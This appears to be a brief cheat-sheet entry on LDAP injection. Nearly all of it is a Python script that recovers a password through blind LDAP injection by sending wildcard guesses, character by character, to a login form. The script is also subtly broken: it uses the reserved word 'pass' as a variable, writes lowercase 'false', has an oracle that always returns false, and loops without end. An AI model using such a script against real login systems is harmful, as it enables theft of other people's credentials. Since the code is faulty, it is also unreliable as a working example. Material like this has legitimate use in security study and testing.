# LDAP Injection

Example of retrieving a password using blind LDAP injection from a login form:

```python
#!/usr/bin/python3

import requests
import string
import re

charset = "{}_-" + string.ascii_letters + string.digits
url = '<url>'

def go(p):
  d = {"username": "<username>", "password": f"{p}*"}
  r = requests.post(url + '/login', allow_redirects=False, data=d)
  # return true on success, false on error depending on the response
  return false
  
pass = ""
while True:
  for c in charset:
    if go(pass + c):
        pass +=  c
        print(pass)
```

